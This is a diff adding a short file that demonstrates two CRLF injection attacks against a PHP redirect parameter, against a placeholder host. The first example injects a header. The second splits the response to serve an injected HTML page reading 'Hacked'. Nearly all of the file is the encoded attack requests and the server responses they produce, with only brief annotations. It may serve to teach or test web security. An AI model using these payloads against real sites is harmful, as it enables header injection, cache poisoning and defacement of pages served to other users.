@@ -1,0 +1,58 @@
+1) Header Manipulation using CRLF
+
+Request :
+
+GET /example.php?url=%0D%0ANew_Header:New_Header_Value%0D%0A HTTP/1.1[CRLF]
+Host: www.example.com[CRLF]
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0[CRLF]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[CRLF]
+Accept-Language: en-us,en;q=0.5[CRLF]
+Accept-Encoding: gzip, deflate[CRLF]
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[CRLF]
+Connection: keep-alive[CRLF][CRLF]
+
+Response :
+
+HTTP/1.1 302 Found[CRLF]
+Date: Tue, 23 Aug 2011 18:34:36 GMT[CRLF]
+Server: Apache/1.3.33 (Win32) PHP/5.0.2[CRLF]
+X-Powered-By: PHP/5.0.2[CRLF]
+Location:[CRLF]
+New_Header: New_Header_Value[CRLF]  (An injected header field using the CRLF characters, )
+Keep-Alive: timeout=15, max=99[CRLF]
+Connection: Keep-Alive[CRLF]
+Transfer-Encoding: chunked[CRLF]
+Content-Type: text/html[CRLF][CRLF]
+
+
+
+2) Code Injection and Response Splitting
+
+Request:
+GET /example.php?url=%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Ccenter%3E%3Ch1%3EHacked%3C/h1%3E%3C/center%3E HTTP/1.1[CRLF]
+Host: www.example.com[CRLF]
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0[CRLF]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[CRLF]
+Accept-Language: en-us,en;q=0.5[CRLF]
+Accept-Encoding: gzip, deflate[CRLF]
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[CRLF]
+Connection: keep-alive[CRLF][CRLF]
+
+Response :
+
+HTTP/1.1 302 Found[CRLF]
+Date: Tue, 23 Aug 2011 18:49:08 GMT[CRLF]
+Server: Apache/1.3.33 (Win32) PHP/5.0.2[CRLF]
+X-Powered-By: PHP/5.0.2[CRLF]
+Location:[CRLF]
+Content-Type: text/html[CRLF][CRLF]
+
+HTTP/1.1 200 OK [CRLF] (*New Response Header Created Using CRLF Injection*)
+Content-Type: text/html[CRLF][CRLF]
+
+<center><h1>Hacked</h1></center>[CRLF]
+Keep-Alive: timeout=15, max=100[CRLF]
+Connection: Keep-Alive[CRLF]
+Transfer-Encoding: chunked[CRLF]
+Content-Type: text/html[CRLF][CRLF]
+0
